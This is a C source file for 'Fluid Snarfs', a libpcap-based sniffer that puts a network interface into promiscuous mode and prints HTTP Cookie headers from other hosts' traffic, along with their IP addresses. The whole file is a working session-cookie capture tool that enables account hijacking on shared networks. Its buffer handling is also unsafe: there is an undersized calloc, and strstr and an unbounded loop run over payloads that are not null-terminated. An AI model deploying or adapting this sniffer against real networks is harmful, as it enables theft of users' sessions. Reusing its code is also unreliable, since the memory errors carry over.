/*
 * Fluid Snarfs - The cookie monster
 * fluidsnarfs.c
 * 
 * I'm a HTTP cookie eater moster.
 *
 * Copyright (c) 2008 Sebastián Castillo Builes <castillobuiles@gmail.com>
 * All rights reserved.
 * 
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   For a copy of the GNU General Public License see the LICENSE file
 *   or see <http://www.gnu.org/licenses/>
 *
 */

#include <stdio.h>		/* standard buffered input/output */
#include <pcap.h>		/* tcpdump packet capture library */
#include <arpa/inet.h>		/* definitions for internet operations */
#include <stdlib.h>             /* exit function and status definition */
#include <net/if.h>		/* device name size */
#include <string.h>		/* memset */

#include <unistd.h>		/* getuid */
#include <ctype.h>		/* isprint */

#include <time.h>		/* date time stuff */

#include <signal.h>		/* to manage SIGINT */

#include "../includes/fluidsnarfs.h"

static char pcap_errbuf[PCAP_ERRBUF_SIZE];	/* sniffer error buffer */

/*
 * Device management
 *
 * device_get_inet4_addr: Gets the ip address for the specified device
 * device_check_link: check link type
 * 
 */
bpf_u_int32
device_get_ip_address (char* dev_name)
{
  bpf_u_int32 net, mask;
  int pcap_lookupnet_return;
  
  pcap_lookupnet_return = pcap_lookupnet (dev_name, &net, &mask, pcap_errbuf);
  if (pcap_lookupnet_return == -1)
    {
      fprintf (stderr, "\nError getting device inet address:\n%s\n",
	       pcap_errbuf);
      return 0;
    }
  return net;
}

int
device_check_link (pcap_t* pcap, char* dev_name)
{
  int datalink;
  
  datalink = pcap_datalink(pcap);
  if (datalink != DLT_EN10MB)
    {
      fprintf (stderr, "%s is not an Ethernet device\n", dev_name);
      return -1;
    }
  return 0;
}


/*
 * legal banner
 */
void
print_banner (void)
{
  printf ("My name is %s,\n%s\nversion %s\n", APP_NAME, APP_DESC,
	  APP_VERSION);
  printf ("\n%s\n", APP_COPYRIGHT);
  printf ("%s\n", APP_DISCLAIMER);
  printf ("\n");
  
  return;
}

/*
 * usage syntax
 */
void
print_usage (void)
{
  printf ("Usage: %s [interface]\n", APP_NAME);
  printf ("\n");
  printf ("Options:\n");
  printf ("\tinterface\tNetwork interface for listen on.\n");
  printf ("\n");

  return;
}


unsigned char*
get_cookie (const unsigned char* payload, int len)
{
  unsigned char* cookie;

  cookie = (unsigned char*) strstr ((char*) payload, "Cookie");
  
  return cookie;
}


/*
 * HTTP sniffer
 */

int
start_sniffing (pcap_t* pcap)
{
  int pcap_loop_return;
  
  pcap_loop_return = pcap_loop (pcap, -1, get_tcp_payload, NULL);
  if ( pcap_loop_return < 0 )
    {
      close_pcap_session (pcap);
      return -1;
    }

  close_pcap_session (pcap);
  return 0;
}

void
get_tcp_payload (unsigned char* args,
		 const struct pcap_pkthdr* header,
		 const unsigned char* packet)
{
  static int count = 1;

  // TODO: Dont do the printf here!!, improve the way to get payload withouth all ether, ip, tcp stuff                                                                                                              
  // const struct ethernet_headed *ether;
  const struct ip_header* ip;
  const struct tcp_header* tcp;
  const unsigned char* payload;
  const unsigned char* cookie;

  int size_ip, size_tcp = 0, size_payload;
  
  const unsigned char* ch;

  //ether = (struct ethernet_header*)(packet);

  ip = (struct ip_header*) (packet + SIZE_ETHERNET);
  size_ip = IP_HL (ip) * 4;

  if ( size_ip < 20 )
    {
      printf ("   * Invalid IP header length: %u bytes\n", size_ip);
      return;
    }

  if (ip->ip_p != IPPROTO_TCP)
    {
      printf ("\ninvalid protocol\n");
      return;
    }

  tcp = (struct tcp_header*) (packet + SIZE_ETHERNET + size_ip);
  if ((size_tcp = TH_OFF (tcp) * 4) < 20)
    {
      printf ("Invalid TCP header length: %u bytes\n", size_tcp);
      return;
    }


  payload = (unsigned char*) (packet + SIZE_ETHERNET + size_ip + size_tcp);
  size_payload = ntohs (ip->ip_len) - (size_ip + size_tcp);

  if (size_payload > 0)
    {
      cookie = get_cookie(payload, size_payload);
      
      if ( cookie != NULL )
	{
	  /* print source and destination IP addresses */
	  printf ("from: %s\n", inet_ntoa (ip->ip_src));
	  printf ("to: %s\n", inet_ntoa (ip->ip_dst));
	  printf ("payload (%d bytes):\n", size_payload);

	  ch = cookie;
	  while (*ch != '\n')
	    {
	      printf( "%c", isprint(*ch) ? *ch : '.' );
	      ch++;
	    }
	  printf ("\n");
	  printf ("%d packets since start\n\n", count);
	  count++;
	}
    }
  
  return;
}

void
close_pcap_session (pcap_t* pcap)
{
  pcap_close (pcap);
  return;
}

pcap_t*
open_pcap_session (char* dev_name)
{
  pcap_t* pcap; /* session file descriptor */
  
  pcap = pcap_open_live (dev_name, BUFSIZ, 1, 0, pcap_errbuf);
  if ( pcap == NULL )
    {
      fprintf (stderr, "\nError opening device for sniffing session:\n%s\n",
	       pcap_errbuf);
      return NULL;
    }
  
  return pcap;
}

int
set_pcap_filter (pcap_t* pcap, bpf_u_int32 ip_addr, char* port)
{
  int pcap_compile_return, pcap_setfilter_return;
  char* filter;
  struct bpf_program compiled_filter;

  //TODO: sprintf
#define PREFILTER "port "
  
  filter =
    (char*) calloc (strlen (port) + strlen (PREFILTER), sizeof (char));
  
  strcat (filter, PREFILTER);
  strcat (filter, port);
  
  pcap_compile_return = 
    (pcap_compile (pcap, &compiled_filter, filter, 1000, ip_addr));
  
  if ( pcap_compile_return < 0)
    {
      fprintf (stderr, "\nError compiling pcap filter:\n%s\n",
	       pcap_geterr (pcap));
      return -1;
    }

  pcap_setfilter_return = (pcap_setfilter (pcap, &compiled_filter));
  
  if ( pcap_setfilter_return < 0 )
    {
      fprintf (stderr, "\nError setting pcap filter:\n%s\n",
	       pcap_geterr (pcap));
      return -1;
    }
  /* free compiling resources */
  pcap_freecode (&compiled_filter);
  
  return 0;
}


/* Catch SIGINT, show stats and exit*/
/* FIXME: How to pass pcap_t to signal manager??*/
/* I dont wanna have a global stuff :( */
void
catch_signal (int signal)
{
  /*struct pcap_stat stats;

     if (pcap_stats(pcap, &stats) < 0){
     fprintf(stderr, pcap_geterr(pcap));
     exit(EXIT_FAILURE);
     } */

  //printf ("\n---Stats:\n\n");
  //printf ("Received: %d\n", 2);	//stats.ps_recv);
  printf("\n\n---Bye---i\n\n");
  exit (EXIT_SUCCESS);
}

char*
timestamp ()
{
  time_t rawtime;
  struct tm* timeinfo;

  time (&rawtime);
  timeinfo = localtime (&rawtime);
  
  return asctime(timeinfo);
}


int
main (int argc, char* argv[])
{
  pcap_t* pcap;                 /* session filedescriptor */
  char* dev_name = argv[1];	/* TODO: Default deviec management */
  bpf_u_int32 ip_addr;

  char* port;			/* port to pcap_filter traffic */

  uid_t uid;

    
  int device_check_link_return; /* return sucess or failure value */

  if (argc > 3 || argc < 2)
    {
      fprintf (stderr, "\nERROR: Invalid number of arguments!\n\n");
      print_usage ();
      exit (EXIT_FAILURE);
    }
  else if (argc == 3)
    {
      port = argv[2];
    }
  else
    {
      port = DEFAULT_PORT;
    }

  if ((uid = getuid ()) != ROOT_USER)
    {
      fprintf (stderr,
	       "\nERROR: Sorry uid %d, you've to make your own sandwich.\n\n",
	       uid);
      print_usage ();
      exit (EXIT_FAILURE);
    }
  
  /* open session and get filedescriptor */
  pcap = open_pcap_session (dev_name);
  
  if ( pcap == NULL )
    {
      exit (EXIT_FAILURE);
    }
  
  /* get the device ip address. needed to apply filter */
  ip_addr = device_get_ip_address (dev_name);
  
  if ( ip_addr == 0 )
    {
      exit (EXIT_FAILURE);
    }

  /* filter trafic sniffed in the actual session */
  set_pcap_filter(pcap, ip_addr, port);
  
  /* check link type */
  device_check_link_return = device_check_link (pcap, dev_name);

  if ( device_check_link_return == -1 )
    {
      exit (EXIT_FAILURE);
    }
  
  /* all right.. so say hello and begin */
  print_banner ();
  
  /* catch exit signal to say good bye at the end */
  signal (SIGINT, catch_signal);
  
  printf ("Eating cookies from [%s], port [%s]\n", dev_name, port);
  printf ("%s\n---\n\n", timestamp());
  start_sniffing (pcap);
  
  return 0;
}

// fluidsnarfs.c
